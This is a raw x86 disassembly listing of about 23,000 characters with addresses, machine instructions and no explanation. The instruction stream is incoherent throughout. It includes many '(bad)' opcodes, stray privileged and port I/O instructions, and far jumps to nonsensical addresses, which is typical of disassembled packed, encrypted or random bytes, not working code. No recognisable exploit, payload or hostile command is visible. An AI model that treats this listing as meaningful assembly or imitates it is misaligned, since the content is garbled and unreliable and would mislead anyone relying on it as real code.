  421cd1:	xchg   ebp,eax
  421cd2:	sbb    eax,0x8ff68db9
  421cd7:	mov    ebx,0xd4261dd6
  421cdc:	rcr    DWORD PTR [ecx+ecx*2-0x7991d3e4],cl
  421ce3:	aad    0x89
  421ce5:	std    
  421ce6:	fisub  WORD PTR [edi+0x4d8e199e]
  421cec:	cs push 0x21debff8
  421cf2:	cmp    BYTE PTR [esi+0x78],dh
  421cf5:	dec    edi
  421cf6:	inc    esi
  421cf7:	pop    ds
  421cf8:	add    BYTE PTR [esp+ebp*1],bh
  421cfb:	sub    al,0xe0
  421cfd:	push   cs
  421cfe:	jg     0x421d6e
  421d00:	mov    esp,0xbe5f51b6
  421d05:	cwde   
  421d06:	sbb    DWORD PTR [ebx],eax
  421d08:	pop    ss
  421d09:	cmp    eax,0x236d1e6d
  421d0e:	iret   
  421d0f:	xor    DWORD PTR [ecx+0x47],eax
  421d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d13:	(bad)  
  421d14:	out    dx,eax
  421d15:	push   ss
  421d16:	push   eax
  421d17:	ds dec esp
  421d19:	stos   BYTE PTR es:[edi],al
  421d1a:	pop    ebx
  421d1b:	inc    esp
  421d1c:	sbb    eax,0x312ba142
  421d21:	inc    edx
  421d22:	and    al,0xd4
  421d24:	sbb    al,0xba
  421d26:	(bad)  
  421d28:	xchg   BYTE PTR [ebp-0x29f8cc6b],al
  421d2e:	nop
  421d2f:	push   edi
  421d30:	xor    BYTE PTR [esp+esi*2-0x1587f0f3],ch
  421d37:	add    ebp,DWORD PTR [esi+0x453d2494]
  421d3d:	jbe    0x421d25
  421d3f:	ins    DWORD PTR es:[edi],dx
  421d40:	pop    ebp
  421d41:	sbb    ch,BYTE PTR [edi+0x12]
  421d44:	or     eax,0xac114fea
  421d49:	sbb    BYTE PTR ds:0xd7639fc3,al
  421d4f:	sbb    DWORD PTR [ecx+0x30],0xcaec0bb0
  421d56:	pop    edi
  421d57:	popa   
  421d58:	xor    DWORD PTR [esi*8+0x68a8b62e],esi
  421d5f:	and    DWORD PTR [edi+eiz*2],0xb1f78165
  421d66:	inc    esp
  421d67:	aam    0x71
  421d69:	mov    ebx,DWORD PTR [ebp-0x381b6e8]
  421d6f:	ins    DWORD PTR es:[edi],dx
  421d70:	add    DWORD PTR [esp+esi*1],ecx
  421d73:	(bad)  
  421d74:	mov    ah,0x67
  421d76:	clc    
  421d77:	mov    ecx,0x19a160fe
  421d7c:	out    dx,eax
  421d7d:	scas   al,BYTE PTR es:[edi]
  421d7e:	xchg   DWORD PTR [edx+ecx*8+0x8],ecx
  421d82:	xchg   ebx,eax
  421d83:	jecxz  0x421d96
  421d85:	push   cs
  421d86:	sub    edx,ecx
  421d88:	ret    
  421d89:	xchg   ebx,eax
  421d8a:	lods   al,BYTE PTR ds:[esi]
  421d8b:	fstp   QWORD PTR ds:0x806feebc
  421d91:	dec    eax
  421d92:	dec    esp
  421d93:	imul   esi,DWORD PTR [edi-0xe69031e],0xffffffd9
  421d9a:	pop    ebx
  421d9b:	scas   eax,DWORD PTR es:[edi]
  421d9c:	lods   eax,DWORD PTR ds:[esi]
  421d9d:	inc    eax
  421d9e:	scas   eax,DWORD PTR es:[edi]
  421d9f:	xor    BYTE PTR [esi-0x4e],0x9a
  421da3:	adc    ah,BYTE PTR [edi+0x9]
  421da6:	pop    esp
  421da7:	or     DWORD PTR [edi+ebp*2-0x7f],edi
  421dab:	daa    
  421dac:	xchg   edi,eax
  421dad:	(bad)  
  421dae:	jle    0x421dd9
  421db0:	fst    QWORD PTR [ecx-0x6e]
  421db3:	xchg   edi,eax
  421db4:	not    edi
  421db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421db7:	inc    ebp
  421db8:	int3   
  421db9:	xor    al,0xec
  421dbb:	jne    0x421df9
  421dbd:	stos   BYTE PTR es:[edi],al
  421dbe:	add    bl,BYTE PTR [eax-0x24fbe34d]
  421dc4:	test   BYTE PTR [ebx],dl
  421dc6:	pop    ds
  421dc7:	and    DWORD PTR [ecx-0x39f3eb47],edx
  421dcd:	mov    dl,0x64
  421dcf:	mov    esp,0x215eeaf
  421dd4:	xchg   edx,eax
  421dd5:	mov    esp,0x593989f4
  421dda:	fld    QWORD PTR es:[ebx-0x3e]
  421dde:	dec    esi
  421ddf:	addr16 in al,dx
  421de1:	(bad)  
  421de2:	scas   al,BYTE PTR es:[edi]
  421de3:	imul   esi,DWORD PTR [ecx],0xfffffffb
  421de6:	fbld   TBYTE PTR [ecx-0x27]
  421de9:	push   ss
  421dea:	jge    0x421dda
  421dec:	daa    
  421ded:	aam    0x22
  421def:	mov    esi,0x4a0ae6f2
  421df4:	int    0xb
  421df6:	fs and esi,ecx
  421df9:	sub    DWORD PTR [ecx],edi
  421dfb:	enter  0xb8df,0xca
  421dff:	xor    DWORD PTR [edx+0x16],0xffffff82
  421e03:	fs jo  0x421e47
  421e06:	imul   edi,DWORD PTR [edi],0x6a
  421e09:	push   0x99ff3fb
  421e0e:	push   ss
  421e0f:	ds inc ch
  421e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e13:	(bad)  
  421e14:	ret    
  421e15:	pop    eax
  421e16:	test   DWORD PTR [ecx+0x35f35e7b],edx
  421e1c:	and    ah,BYTE PTR [ebp-0x8]
  421e1f:	call   DWORD PTR [ebp+0x61931b18]
  421e25:	jbe    0x421df2
  421e27:	lds    eax,FWORD PTR [edx]
  421e29:	fcmovbe st,st(2)
  421e2b:	dec    ecx
  421e2c:	rol    DWORD PTR [ecx+0x3c113c34],0xd8
  421e33:	jbe    0x421e73
  421e35:	mov    eax,0xf550362b
  421e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e3b:	sub    DWORD PTR [ebp-0x24],edx
  421e3e:	xchg   DWORD PTR [edi+0x48],edx
  421e41:	jnp    0x421e22
  421e43:	nop
  421e44:	cmp    al,0x92
  421e46:	aad    0xc6
  421e48:	mov    ch,0x73
  421e4a:	pop    ecx
  421e4b:	daa    
  421e4c:	sub    al,0xb8
  421e4e:	mov    ebp,0x4ebb1ec
  421e53:	sub    BYTE PTR [ecx],0x31
  421e56:	sahf   
  421e57:	mov    esi,DWORD PTR [eax]
  421e59:	out    dx,al
  421e5a:	xor    ch,al
  421e5c:	fiadd  WORD PTR [edx-0x47]
  421e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e60:	xchg   edi,eax
  421e61:	mov    WORD PTR [ebp-0x643502fa],?
  421e67:	sbb    bh,BYTE PTR [ecx]
  421e69:	sbb    DWORD PTR ds:0xe5d1df99,0x3248669d
  421e73:	cld    
  421e74:	pop    ss
  421e75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e76:	xchg   BYTE PTR [ebp-0x19],dh
  421e79:	jp     0x421e83
  421e7b:	cmp    eax,0xd59a1140
  421e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e81:	or     ecx,ebp
  421e83:	imul   esp,ebx,0xffffffdc
  421e86:	fist   WORD PTR ds:0x9dab0a34
  421e8c:	in     al,dx
  421e8d:	cmc    
  421e8e:	fdivr  DWORD PTR [edx+0x1ca329f]
  421e94:	test   eax,0x27f39471
  421e99:	adc    ebp,DWORD PTR [eax-0x635c52ce]
  421e9f:	sbb    eax,0xd6986f52
  421ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea6:	adc    esi,ebx
  421ea8:	add    ebp,DWORD PTR [esi]
  421eaa:	por    mm2,QWORD PTR [ebp+0x70]
  421eae:	es add ch,dl
  421eb1:	dec    esp
  421eb2:	arpl   WORD PTR [ebp-0x34732fce],bp
  421eb8:	sbb    esi,ebp
  421eba:	or     DWORD PTR [edi-0x54fb3060],esi
  421ec0:	pop    es
  421ec1:	xor    edi,DWORD PTR [ebx-0x3]
  421ec4:	adc    cl,ch
  421ec6:	adc    BYTE PTR [ebx],0x48
  421ec9:	lahf   
  421eca:	inc    ebp
  421ecb:	fcmovb st,st(0)
  421ecd:	push   0xffffffef
  421ecf:	cmp    cl,0xdf
  421ed2:	inc    esp
  421ed3:	stos   DWORD PTR es:[edi],eax
  421ed4:	push   es
  421ed5:	(bad)  
  421ed6:	cli    
  421ed7:	test   eax,0xd447460d
  421edc:	mov    gs,WORD PTR [eax+ecx*2+0x24eaf3a1]
  421ee3:	inc    esi
  421ee4:	popa   
  421ee5:	inc    esp
  421ee6:	pushf  
  421ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ee8:	sbb    BYTE PTR [edi-0x1e],dl
  421eeb:	ins    BYTE PTR es:[edi],dx
  421eec:	xchg   ebx,eax
  421eed:	push   ecx
  421eee:	mov    al,0xbc
  421ef0:	mov    DWORD PTR [esi+0x2e23bac9],edi
  421ef6:	imul   esp,DWORD PTR [eax+0x407d6d8d],0xe7ba341f
  421f00:	mov    ebx,0xcdbcb2ef
  421f05:	inc    ecx
  421f06:	sub    BYTE PTR [esi+0x51],bl
  421f09:	fisttp DWORD PTR [ebx+esi*1+0x75]
  421f0d:	div    DWORD PTR ds:0xd7417e27
  421f13:	ret    
  421f14:	push   ebp
  421f15:	test   al,0x5f
  421f17:	cmp    al,0xcc
  421f19:	mov    ds:0xe05c05d8,eax
  421f1e:	ins    BYTE PTR es:[edi],dx
  421f1f:	(bad)  
  421f20:	fstp   QWORD PTR [eax-0x33]
  421f23:	ficomp WORD PTR [ecx]
  421f25:	fisttp QWORD PTR [edi]
  421f27:	or     DWORD PTR [ecx],0x2a2e86f4
  421f2d:	js     0x421efb
  421f2f:	or     ah,BYTE PTR [esp+eax*4]
  421f32:	mov    bh,0xd8
  421f34:	pop    edi
  421f35:	lock mov esp,0xab28d573
  421f3b:	fnstsw WORD PTR [ebx]
  421f3d:	cmp    dh,BYTE PTR [edx+0x6ea33818]
  421f43:	loopne 0x421f6b
  421f45:	lahf   
  421f46:	sbb    edx,DWORD PTR [edi]
  421f48:	hlt    
  421f49:	popf   
  421f4a:	(bad)  
  421f4b:	out    0xbf,al
  421f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f4e:	int    0x2b
  421f50:	es sub al,0x75
  421f53:	push   cs
  421f54:	cmp    edx,DWORD PTR ds:0x456ae1cf
  421f5a:	aad    0x2f
  421f5c:	xchg   edx,eax
  421f5d:	sub    ebx,ecx
  421f5f:	in     eax,0x6b
  421f61:	(bad)
  421f65:	inc    ecx
  421f66:	jne    0x421efe
  421f68:	shl    DWORD PTR [edi+edi*2],1
  421f6b:	inc    ebx
  421f6c:	sub    eax,DWORD PTR [edi-0x1f]
  421f6f:	es jbe 0x421ef2
  421f72:	sub    bh,dh
  421f74:	push   eax
  421f75:	dec    edi
  421f76:	das    
  421f77:	(bad)  
  421f79:	or     ecx,esi
  421f7b:	sbb    edi,DWORD PTR [esi+0x35b33eb2]
  421f81:	or     edx,DWORD PTR [eax]
  421f83:	rol    BYTE PTR [esi+esi*2],0xf6
  421f87:	pop    esp
  421f88:	mov    ebp,DWORD PTR ds:0x55084287
  421f8e:	sbb    eax,0xec65f520
  421f93:	pop    ss
  421f94:	enter  0x4cac,0x59
  421f98:	ret    0xa116
  421f9b:	imul   ebp,DWORD PTR [ecx+0x64],0x1e
  421f9f:	in     eax,dx
  421fa0:	add    bh,al
  421fa2:	adc    ebp,DWORD PTR [esi+0x431394e1]
  421fa8:	(bad)  
  421fa9:	aam    0xc2
  421fab:	adc    bh,BYTE PTR [edx]
  421fad:	adc    BYTE PTR [ecx],0x68
  421fb0:	div    edi
  421fb2:	pushf  
  421fb3:	out    dx,al
  421fb4:	inc    esp
  421fb5:	outs   dx,DWORD PTR ds:[esi]
  421fb6:	mov    al,fs:0x27daa747
  421fbc:	sub    BYTE PTR [ebp+0x26],ch
  421fbf:	ficomp DWORD PTR [ebp-0x5833cf87]
  421fc5:	stc    
  421fc6:	fnstenv [eax+0x48a7c292]
  421fcc:	xchg   ebx,eax
  421fcd:	int    0x3f
  421fcf:	pop    esi
  421fd0:	ss nop
  421fd2:	sbb    BYTE PTR [ecx-0x40],cl
  421fd5:	push   ebx
  421fd6:	sub    DWORD PTR [edi+0x4202f70b],edx
  421fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fdd:	add    al,0x8e
  421fdf:	dec    edi
  421fe0:	xchg   edi,eax
  421fe1:	shl    BYTE PTR ds:0xdd782b7b,0x1f
  421fe8:	pop    edi
  421fe9:	dec    eax
  421fea:	int3   
  421feb:	ds sub ecx,edx
  421fee:	out    dx,al
  421fef:	dec    edx
  421ff0:	sti    
  421ff1:	repnz adc DWORD PTR [ebx+0x644afd94],ebp
  421ff8:	push   edi
  421ff9:	push   edx
  421ffa:	and    al,ch
  421ffc:	dec    ecx
  421ffd:	xlat   BYTE PTR ds:[ebx]
  421ffe:	outs   dx,BYTE PTR ds:[esi]
  421fff:	popf   
  422000:	int3   
  422001:	jno    0x422054
  422003:	ret    0xf828
  422006:	jns    0x421fda
  422008:	jge    0x421f8b
  42200a:	lea    ebx,[edx+0x45]
  42200d:	imul   esi,DWORD PTR [edx+0x5d],0xfffffffb
  422011:	loope  0x421fdd
  422013:	cdq    
  422014:	ins    DWORD PTR es:[edi],dx
  422015:	lods   eax,DWORD PTR ds:[si]
  422017:	mov    al,0x49
  422019:	jb     0x422090
  42201b:	inc    BYTE PTR [esi]
  42201d:	cmp    BYTE PTR [esi+0x2],cl
  422020:	pop    ecx
  422021:	jge    0x422083
  422023:	mov    dh,0xa9
  422025:	mov    ecx,DWORD PTR [eax+0x12]
  422028:	inc    ebp
  422029:	ss test al,0x40
  42202c:	sub    ah,ah
  42202e:	push   ds
  42202f:	mov    eax,ds:0x65a584d9
  422034:	mov    dl,0x5c
  422036:	xchg   ebx,eax
  422037:	jmp    0x543d840e
  42203c:	scas   eax,DWORD PTR es:[edi]
  42203d:	add    ecx,ecx
  42203f:	mov    BYTE PTR [ebp+0x23],bh
  422042:	xchg   ecx,eax
  422043:	sbb    ch,BYTE PTR [ebx]
  422045:	mov    BYTE PTR [edi],0x58
  422048:	inc    ebx
  422049:	loope  0x422031
  42204b:	(bad)  
  42204c:	pop    esp
  42204d:	pop    edi
  42204e:	retf   0x77f6
  422051:	jno    0x422073
  422053:	mov    eax,0xa4931179
  422058:	cmp    BYTE PTR [esi+eiz*1+0x687985d9],dl
  42205f:	retf   0x56db
  422062:	ins    DWORD PTR es:[edi],dx
  422063:	pop    ebx
  422064:	mov    ds:0x6126a109,eax
  422069:	lds    edx,FWORD PTR [edx+0x217eef2f]
  42206f:	dec    edx
  422070:	mov    edi,0x13ce3d56
  422075:	retf   
  422076:	jbe    0x42206a
  422078:	mov    ah,0xc0
  42207a:	inc    ebp
  42207b:	inc    ecx
  42207c:	pop    esi
  42207d:	push   es
  42207e:	xchg   edi,eax
  42207f:	leave  
  422080:	out    dx,al
  422081:	rol    ebp,1
  422083:	jp     0x4220ac
  422085:	pop    esp
  422086:	adc    ebx,ebp
  422088:	sub    al,0x3e
  42208a:	popa   
  42208b:	xchg   esp,eax
  42208c:	mov    ecx,0x9fe084a0
  422091:	sub    BYTE PTR [esi+0x26],dh
  422094:	inc    esp
  422095:	lea    ebp,[edi-0xfcbe3db]
  42209b:	rcr    BYTE PTR [ebx],0x6
  42209e:	push   edi
  42209f:	fdiv   DWORD PTR [eax-0xa]
  4220a2:	mov    al,ds:0xffd32450
  4220a7:	xchg   esi,eax
  4220a8:	test   DWORD PTR [ecx+eiz*4-0x1e],esi
  4220ac:	jecxz  0x422079
  4220ae:	push   0x56
  4220b0:	inc    edi
  4220b1:	or     eax,0x202b0d2e
  4220b6:	cmc    
  4220b7:	sbb    al,0x92
  4220b9:	pop    ecx
  4220ba:	ret    0xd332
  4220bd:	scas   eax,DWORD PTR es:[edi]
  4220be:	jne    0x4220b5
  4220c0:	jns    0x42211f
  4220c2:	fimul  DWORD PTR [edx-0x458dc982]
  4220c8:	mov    gs,WORD PTR [edi+0x47641689]
  4220ce:	cs mov dh,0x37
  4220d1:	sbb    al,0x9
  4220d3:	into   
  4220d4:	mov    dh,BYTE PTR [ebx+eax*4-0x69]
  4220d8:	mov    ecx,0x4d85592c
  4220dd:	add    cl,BYTE PTR [ebx-0x19916324]
  4220e3:	dec    edi
  4220e4:	jb     0x422140
  4220e6:	in     al,dx
  4220e7:	mov    bh,0xb5
  4220e9:	psllq  mm6,mm3
  4220ec:	pop    edi
  4220ed:	shl    DWORD PTR [ebx-0x7643b31c],1
  4220f3:	push   cs
  4220f4:	daa    
  4220f5:	pushf  
  4220f6:	mov    dh,0xf5
  4220f8:	mov    eax,0x7d02a8aa
  4220fd:	popf   
  4220fe:	in     eax,dx
  4220ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422100:	popa   
  422101:	xchg   edi,eax
  422102:	ja     0x4220e1
  422104:	(bad)  
  422105:	jp     0x422111
  422107:	mov    ecx,0x26b6808f
  42210c:	adc    BYTE PTR [esi+ecx*1-0x20],ch
  422110:	xchg   ebp,eax
  422111:	xor    al,0xfc
  422113:	sub    cl,BYTE PTR [edx+0xb]
  422116:	adc    eax,eax
  422118:	mov    cl,0xb3
  42211a:	fld    TBYTE PTR [edi]
  42211c:	repnz sbb eax,edi
  42211f:	gs fld st(5)
  422122:	cdq    
  422123:	mov    ebx,0xe1b6fd54
  422128:	sub    DWORD PTR [ebx-0x3e],ebp
  42212b:	sbb    eax,0x921c4b41
  422130:	pop    esp
  422131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422132:	es push edx
  422134:	dec    ebp
  422135:	data16 mov bh,0xad
  422138:	cld    
  422139:	jno    0x42211b
  42213b:	jecxz  0x422198
  42213d:	mov    DWORD PTR [esi+0x6d52ff2],esi
  422143:	into   
  422144:	sub    edx,DWORD PTR [ebx+0x29080a63]
  42214a:	loopne 0x422195
  42214c:	pop    ebx
  42214d:	jno    0x422123
  42214f:	push   0xffffffac
  422151:	jno    0x42214a
  422153:	sar    DWORD PTR [eax],0xfd
  422156:	pushf  
  422157:	out    dx,al
  422158:	mov    cs,WORD PTR [ecx]
  42215a:	ja     0x4221d3
  42215c:	or     al,BYTE PTR [ebx]
  42215e:	dec    esp
  42215f:	pop    ebp
  422160:	pusha  
  422161:	in     al,0xc2
  422163:	xchg   edx,eax
  422164:	in     eax,0xaa
  422166:	xchg   BYTE PTR [edi+0x75],ah
  422169:	sub    eax,0x26cfaa4a
  42216e:	aam    0xaf
  422170:	mov    al,ds:0x4159ac58
  422175:	cmp    eax,0xe467455d
  42217a:	test   eax,0x3e49dacb
  42217f:	idiv   BYTE PTR [edx+eiz*1-0x27b5f37b]
  422186:	jl     0x422189
  422188:	cwde   
  422189:	inc    esi
  42218a:	bound  ecx,QWORD PTR [eax+0x35d3de18]
  422190:	xchg   esp,eax
  422191:	or     eax,DWORD PTR [eax-0x53]
  422194:	xchg   ecx,eax
  422195:	pop    esi
  422196:	rcl    dl,0x5e
  422199:	fstp   TBYTE PTR [edi-0x172706dd]
  42219f:	call   0x92b6814e
  4221a4:	(bad)
  4221a8:	push   edx
  4221a9:	adc    bh,al
  4221ab:	data16 (bad) 
  4221ad:	mov    ch,BYTE PTR [eax-0x5f]
  4221b0:	popf   
  4221b1:	cmp    DWORD PTR [eax+eiz*1],esi
  4221b4:	nop
  4221b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221b6:	pusha  
  4221b7:	jae    0x42216c
  4221b9:	mov    esi,0xbcc99774
  4221be:	xor    cl,BYTE PTR [esi]
  4221c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221c1:	test   eax,0x4d8decca
  4221c6:	jne    0x422208
  4221c8:	jp     0x422234
  4221ca:	pop    cx
  4221cc:	pushw  ds
  4221ce:	pop    eax
  4221cf:	dec    edx
  4221d0:	xor    al,0xb1
  4221d2:	ror    BYTE PTR [ebx-0x55],0xd
  4221d6:	dec    edi
  4221d7:	mov    eax,ds:0x841397c3
  4221dc:	xor    eax,0xe0873d9c
  4221e1:	push   ds
  4221e2:	ins    BYTE PTR es:[edi],dx
  4221e3:	jbe    0x4221b3
  4221e5:	in     eax,dx
  4221e6:	mov    ds:0x6c1ef4da,al
  4221eb:	cmp    al,0xee
  4221ed:	shl    BYTE PTR [edi],cl
  4221ef:	jnp    0x42223a
  4221f1:	jne    0x42221f
  4221f3:	sub    eax,0x8387fcd0
  4221f8:	jmp    0x6e88:0x67b3a9fc
  4221ff:	mov    ecx,0x2858454b
  422204:	jo     0x4221ba
  422206:	enter  0x3cd,0x43
  42220a:	hlt    
  42220b:	daa    
  42220c:	dec    edx
  42220d:	cs pop es
  42220f:	push   DWORD PTR [ebx-0x2d]
  422212:	dec    ecx
  422213:	outs   dx,DWORD PTR ds:[esi]
  422214:	mov    bh,0x35
  422216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422217:	xor    al,BYTE PTR [eax]
  422219:	mov    bl,0xa4
  42221b:	div    BYTE PTR [ecx-0x26]
  42221e:	push   esi
  42221f:	mov    eax,ds:0xc03cd229
  422224:	ror    BYTE PTR [edi+0x701a526c],1
  42222a:	js     0x422229
  42222c:	push   es
  42222d:	or     DWORD PTR [edx],edi
  42222f:	(bad)  
  422230:	xchg   esp,eax
  422231:	pop    ebp
  422232:	lea    edx,[ecx]
  422234:	gs mov ch,0x52
  422237:	pop    ebx
  422238:	sahf   
  422239:	push   cs
  42223a:	sahf   
  42223b:	outs   dx,DWORD PTR ds:[esi]
  42223c:	mov    ebp,0xddb7d5a7
  422241:	inc    ecx
  422242:	mov    WORD PTR [ebp-0x97eb0a3],gs
  422248:	or     eax,0x3dae3d8e
  42224d:	outs   dx,DWORD PTR ds:[esi]
  42224e:	lds    ebx,FWORD PTR [eax-0x80]
  422251:	or     eax,0x7600a45e
  422256:	ins    BYTE PTR es:[edi],dx
  422257:	push   edx
  422258:	sub    BYTE PTR [ebp-0x36],ch
  42225b:	(bad)  
  42225c:	fsubp  st(4),st
  42225e:	inc    esi
  42225f:	in     al,dx
  422260:	pop    esi
  422261:	(bad)  
  422262:	div    bl
  422264:	sbb    al,0x40
  422266:	adc    al,0xc5
  422268:	jns    0x4222b1
  42226a:	pop    ebp
  42226b:	xchg   BYTE PTR ds:0x9be90995,ch
  422271:	retf   0x83d3
  422274:	ret    0x7eb5
  422277:	jbe    0x422287
  422279:	add    DWORD PTR [ebx],ecx
  42227b:	call   0xf810:0xda1e8002
  422282:	mov    WORD PTR [ecx+0x759324f],?
  422288:	iret   
  422289:	xor    eax,DWORD PTR [esi-0x3f0f7599]
  42228f:	pop    ebx
  422290:	pop    edi
  422291:	push   eax
  422292:	adc    DWORD PTR ds:0xd4250fff,esi
  422298:	xchg   ebp,eax
  422299:	inc    eax
  42229a:	add    dl,dh
  42229c:	addr16 dec ebx
  42229e:	rcr    BYTE PTR [edx],1
  4222a0:	aaa    
  4222a1:	clc    
  4222a2:	cmp    al,0x33
  4222a4:	stc    
  4222a5:	or     eax,0x25e1ac99
  4222aa:	stos   BYTE PTR es:[edi],al
  4222ab:	xor    eax,0x17f6fd95
  4222b0:	cli    
  4222b1:	mov    esp,0x7c6d8b38
  4222b6:	(bad)  [edi-0x58db4b36]
  4222bc:	mov    eax,ds:0x712bab1c
  4222c1:	adc    eax,0xfa5da589
  4222c6:	mov    ds:0x4b1d2e27,eax
  4222cb:	jb     0x4222c4
  4222cd:	test   ebx,esp
  4222cf:	(bad)  
  4222d0:	data16 jle 0x42225b
  4222d3:	repnz mov al,0x57
  4222d6:	pusha  
  4222d7:	cmp    DWORD PTR [edx],0x8
  4222da:	(bad)
  4222df:	pop    esi
  4222e0:	imul   ecx,esi,0x373035b2
  4222e6:	ret    0xc113
  4222e9:	adc    DWORD PTR [edi],0x4460eb37
  4222ef:	and    eax,0x6b9ab7be
  4222f4:	pop    ecx
  4222f5:	cmp    BYTE PTR [eax],al
  4222f7:	je     0x42229f
  4222f9:	or     DWORD PTR [ecx-0x52f3c392],ecx
  4222ff:	xchg   esp,eax
  422300:	(bad)  
  422301:	in     al,dx
  422302:	popf   
  422303:	int3   
  422304:	rcr    DWORD PTR [esi+eax*1],cl
  422307:	mov    al,ds:0x77b1dde5
  42230c:	dec    ebp
  42230d:	loopne 0x4222a0
  42230f:	mov    ah,0xeb
  422311:	jb     0x42237c
  422313:	xchg   ebx,eax
  422314:	or     dl,BYTE PTR [eax]
  422316:	mov    ebp,0x62c66db4
  42231b:	xchg   ebx,eax
  42231c:	call   0xd147:0x5b30f94d
  422323:	cwde   
  422324:	push   cs
  422325:	ins    BYTE PTR es:[edi],dx
  422326:	stos   BYTE PTR es:[edi],al
  422327:	lock lock jecxz 0x422373
  42232b:	shr    BYTE PTR [edx],0x95
  42232e:	jns    0x42230b
  422330:	cmp    al,0x4b
  422332:	or     BYTE PTR [eax+edi*2+0x1e],al
  422336:	sbb    DWORD PTR [ebp-0x2f9c285a],esi
  42233c:	call   0xbb4f:0xfe41e2b4
  422343:	and    ch,bh
  422345:	fs sahf 
  422347:	std    
  422348:	or     al,0x5f
  42234a:	push   0x93a243f9
  42234f:	lods   al,BYTE PTR ds:[esi]
  422350:	test   ecx,esp
  422352:	jmp    0x4222ef
  422354:	call   0x469:0x68cbd8e6
  42235b:	sub    al,0x8c
  42235d:	shl    DWORD PTR ds:0x3e3df689,0x4
  422364:	pushf  
  422365:	hlt    
  422366:	es enter 0xf0d2,0xa3
  42236b:	or     ecx,DWORD PTR [esi+0x22dae652]
  422371:	ins    DWORD PTR es:[edi],dx
  422372:	nop
  422373:	inc    esp
  422374:	xchg   DWORD PTR [eax-0x4ea273ee],esi
  42237a:	push   cs
  42237b:	ins    DWORD PTR es:[edi],dx
  42237c:	pop    ds
  42237d:	mov    esi,0x19d240fe
  422382:	imul   ecx,DWORD PTR [ecx],0x523d4770
  422388:	xor    eax,0x5c8bf305
  42238d:	in     al,dx
  42238e:	adc    DWORD PTR [ecx+0x6],ebx
  422391:	popa   
  422392:	xor    DWORD PTR [esi],ebx
  422394:	sub    eax,DWORD PTR [edi+0x1b]
  422397:	sub    al,0xa3
  422399:	or     ebp,ecx
  42239b:	dec    ebx
  42239c:	dec    edx
  42239d:	add    eax,0x29498179
  4223a2:	call   0xefe3fd42
  4223a7:	jl     0x422380
  4223a9:	shl    DWORD PTR [ecx-0x331a41f7],cl
  4223af:	sub    esi,ecx
  4223b1:	out    dx,al
  4223b2:	mov    bh,0x16
  4223b4:	add    esi,DWORD PTR ds:[esi-0x53]
  4223b8:	mov    esi,0x9ac69923
  4223bd:	mov    cl,BYTE PTR [ebx-0x3e75cf0a]
  4223c3:	fmul   QWORD PTR [ebx+0x71]
  4223c6:	push   ss
  4223c7:	aad    0x1e
  4223c9:	push   ds
  4223ca:	popf   
  4223cb:	retf   0x18ea
  4223ce:	mov    BYTE PTR [ebp-0x48],bl
  4223d1:	dec    edi
  4223d2:	xchg   sp,ax
  4223d4:	cmp    DWORD PTR [esi],edx
  4223d6:	and    edi,0xffffffe0
  4223d9:	js     0x42242b
  4223db:	push   ecx
  4223dc:	aam    0xfa
  4223de:	jnp    0x422459
  4223e0:	cmp    al,0x6f
  4223e2:	push   ds
  4223e3:	jge    0x4223ce
  4223e5:	and    ah,BYTE PTR [edx-0x3a]
  4223e8:	fcomp  QWORD PTR [ecx-0x12]
  4223eb:	push   ebp
  4223ec:	lods   eax,DWORD PTR ds:[esi]
  4223ed:	mov    bl,0x4a
  4223ef:	sar    DWORD PTR [edx+0xaef08ce],cl
  4223f5:	mov    es,ebx
  4223f7:	imul   edx,DWORD PTR [esi-0x36cd135],0x20012367
  422401:	imul   eax,eax,0xa
  422404:	adc    ebx,DWORD PTR [esi+0x4a]
  422407:	pop    esi
  422408:	or     ah,ch
  42240a:	in     al,0xd5
  42240c:	push   ebp
  42240d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42240e:	sbb    dl,BYTE PTR [edi+0x2cd0fd06]
  422414:	or     al,0x5c
  422416:	sub    DWORD PTR [eax+0x47],0xa15cf638
  42241d:	mov    ebx,0x75195ee1
  422422:	das    
  422423:	jmp    0x3d0075b4
  422428:	jb     0x42247f
  42242a:	mov    edx,0xe8bde42b
  42242f:	addr16 mov eax,ds:0x8c82
  422433:	sub    BYTE PTR [esi+0x28adc010],0x1
  42243a:	push   esi
  42243b:	pop    edi
  42243c:	mov    BYTE PTR [ebp+ebx*1+0x64],ch
  422440:	lock in al,0x65
  422443:	xor    al,0xff
  422445:	daa    
  422446:	sub    DWORD PTR [ebx-0x3d],0xeda53b69
  42244d:	scas   eax,DWORD PTR es:[edi]
  42244e:	inc    ecx
  42244f:	add    edx,DWORD PTR [edi+0x21]
  422452:	pop    es
  422453:	aaa    
  422454:	mov    WORD PTR [eax],fs
  422456:	fs lahf 
  422458:	jb     0x4224a2
  42245a:	or     al,0x62
  42245c:	lock jle 0x422424
  42245f:	sub    al,0x22
  422461:	sub    ah,BYTE PTR [edi-0x51]
  422464:	pushf  
  422465:	dec    ebx
  422466:	retf   
  422467:	mov    ds:0x3f01e3c,eax
  42246c:	inc    ecx
  42246d:	fistp  DWORD PTR [edi+ebx*4-0x4274eada]
  422474:	xchg   esi,eax
  422475:	add    BYTE PTR [edi-0x14],cl
  422478:	jmp    0x92329656
  42247d:	xor    BYTE PTR [eax-0x2],cl
  422480:	and    eax,0x8f63fbd4
  422485:	jecxz  0x422484
  422487:	pop    esi
  422488:	or     DWORD PTR [eax],ebp
  42248a:	les    edi,FWORD PTR [ebx-0x1bf4ad59]
  422490:	jns    0x2480e7ae
  422496:	mov    dl,0x12
